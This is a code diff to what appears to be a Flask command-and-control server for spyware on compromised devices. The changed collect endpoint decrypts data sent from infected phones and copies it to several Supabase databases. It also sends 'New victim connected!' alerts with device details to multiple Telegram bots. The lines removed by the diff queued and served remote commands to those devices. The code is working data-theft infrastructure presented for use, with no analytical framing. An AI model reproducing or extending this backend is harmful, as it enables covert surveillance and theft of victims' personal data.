@@ -2,11 +2,10 @@ import os
 import json
 import base64
 import logging
+import requests
 from flask import Flask, request, jsonify
-from security_shield import SecurityShield
-from db_manager import save_data, get_pending_commands
-from command_retry_queue import CommandRetryQueue
-from fallback_executor import FallbackExecutor
+from supabase import create_client
+from server.core.security_shield import SecurityShield
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -14,17 +13,41 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 
 master_secret_b64 = os.environ.get('MASTER_SECRET_B64')
-if not master_secret_b64:
-    raise ValueError("MASTER_SECRET_B64 required")
-master_secret = base64.b64decode(master_secret_b64)
-salt = os.environ.get('SALT')
-if not salt:
-    raise ValueError("SALT required")
-salt = salt.encode()
+salt = os.environ.get('SALT', 'default_salt')
 
-shield = SecurityShield(master_secret, salt)
-retry_queue = CommandRetryQueue()
-fallback = FallbackExecutor()
+if not master_secret_b64:
+    raise ValueError("MASTER_SECRET_B64 is required in Environment Variables")
+
+master_secret = base64.b64decode(master_secret_b64)
+shield = SecurityShield(master_secret, salt.encode())
+
+def send_to_all_supabase(device_id, decrypted_data):
+    for i in range(1, 5):
+        url = os.environ.get(f'SUPABASE_URL_{i}')
+        key = os.environ.get(f'SUPABASE_KEY_{i}')
+        if url and key:
+            try:
+                client = create_client(url, key)
+                client.table('client_info').upsert(decrypted_data).execute()
+                logger.info(f"Data saved to Supabase {i}")
+            except Exception as e:
+                logger.error(f"Error Supabase {i}: {e}")
+
+def notify_all_telegram(device_id, decrypted_data):
+    chat_id = os.environ.get('TELEGRAM_CHAT_ID')
+    if not chat_id:
+        return
+    model = decrypted_data.get('model', 'Unknown')
+    battery = decrypted_data.get('battery_level', '??')
+    message = f"New victim connected!\nDevice: {model}\nBattery: {battery}%\nID: {device_id}"
+    for i in range(1, 11):
+        token = os.environ.get(f'TELEGRAM_TOKEN_{i}')
+        if token:
+            try:
+                url = f"https://api.telegram.org/bot{token}/sendMessage"
+                requests.post(url, json={'chat_id': chat_id, 'text': message}, timeout=5)
+            except Exception as e:
+                logger.error(f"Error Telegram Bot {i}: {e}")
 
 @app.route('/api/v1/collect', methods=['POST'])
 def collect_data():
@@ -36,40 +59,14 @@ def collect_data():
         encrypted_payload = data.get('payload')
         if not device_id or not encrypted_payload:
             return jsonify({"error": "missing fields"}), 400
-        device_key = shield.crypto.derive_device_key(device_id)
-        raw = base64.b64decode(encrypted_payload)
-        decrypted = shield.crypto.decrypt_packet(device_key, raw)
-        payload_str = decrypted.decode('utf-8')
-        save_data(device_id, payload_str)
-        logger.info(f"Data received from {device_id}")
+        decrypted_dict = shield.process_incoming_data(encrypted_payload, device_id)
+        decrypted_dict['device_id'] = device_id
+        send_to_all_supabase(device_id, decrypted_dict)
+        notify_all_telegram(device_id, decrypted_dict)
         return jsonify({"status": "ok"}), 200
     except Exception as e:
-        logger.exception("collect_data error")
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/api/v1/commands/<device_id>', methods=['GET'])
-def get_commands(device_id):
-    try:
-        commands = get_pending_commands(device_id)
-        device_key = shield.crypto.derive_device_key(device_id)
-        encrypted = shield.crypto.encrypt_packet(device_key, json.dumps(commands).encode())
-        return jsonify({"commands": base64.b64encode(encrypted).decode()}), 200
-    except Exception as e:
-        logger.exception("get_commands error")
-        return jsonify({"error": str(e)}), 500
-
-@app.route('/api/v1/commands/push', methods=['POST'])
-def push_command():
-    try:
-        data = request.get_json()
-        device_id = data.get('device_id')
-        command = data.get('command')
-        if not device_id or not command:
-            return jsonify({"error": "missing fields"}), 400
-        save_command(device_id, command)
-        return jsonify({"status": "queued"}), 200
-    except Exception as e:
-        return jsonify({"error": str(e)}), 500
+        logger.exception("Decryption or broadcast error")
+        return jsonify({"error": "processing failed"}), 500
 
 @app.route('/health', methods=['GET'])
 def health():
